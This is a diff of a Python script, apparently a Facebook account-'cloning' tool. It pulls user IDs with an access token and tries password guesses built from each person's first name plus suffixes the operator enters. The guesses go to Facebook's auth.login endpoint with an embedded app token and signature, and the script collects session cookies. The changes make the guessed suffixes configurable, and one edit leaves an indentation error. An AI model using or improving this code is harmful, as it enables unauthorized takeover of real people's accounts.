@@ -424,20 +424,22 @@ def menu_select():
 
 			id.append(uid+'|'+nm)
 
-	if select =="2":
+		if select =="2":
 
 		os.system("clear")
+		
 
 		print(logo)
-
-		print("")
-
-		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
-
-		os.system("clear")
-
-		print logo
-
+		
+		p1 = raw_input("(*) Name + Pass : ")
+		p2 = raw_input("(*) Name + Pass : ")
+		p3 = raw_input("(*) Name + Pass : ")
+		p4 = raw_input("(*) Name + Pass : ")
+		pass5 = raw_input("(*) Password : ")
+		pass6 = raw_input("(*) Password : ")
+		pass7 = raw_input("(*) Password : ")
+		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
+	
 		try:
 
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
@@ -469,7 +471,6 @@ def menu_select():
 			nm=na.rsplit(" ")[0]
 
 			id.append(uid+'|'+nm)
-
 	elif select =="3":
 
 		os.system("clear")
@@ -477,12 +478,19 @@ def menu_select():
 		print logo
 
 		print("")
-
-		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
-
-		os.system("clear")
-
-		print logo
+		print(logo)
+		
+		p1 = raw_input("(*) Name + Pass : ")
+		p2 = raw_input("(*) Name + Pass : ")
+		p3 = raw_input("(*) Name + Pass : ")
+		p4 = raw_input("(*) Name + Pass : ")
+		pass5 = raw_input("(*) Password : ")
+		pass6 = raw_input("(*) Password : ")
+		pass7 = raw_input("(*) Password : ")
+		
+		
+		
+		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
 
 		try:
 
@@ -536,6 +544,7 @@ def menu_select():
 
 	time.sleep(0.5)
 
+
 	print("[!] Plz wait clone account will be appear here")
 
 	print 47*("-")
@@ -551,7 +560,7 @@ def menu_select():
 
 		try:
 
-		    pass1=name+"@123"
+		    pass1= name.lower()+p4
 
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -585,7 +594,7 @@ def menu_select():
 
 		        else:
 
-		            pass2=name+"123"
+		            pass2= name.lower()+p3
 
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -619,7 +628,7 @@ def menu_select():
 
 		                else:
 
-		                    pass3=name+"1234"
+		                    pass3= name.lower()+p2
 
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -653,7 +662,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"12345"
+		                            pass4= name.lower()+p1
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
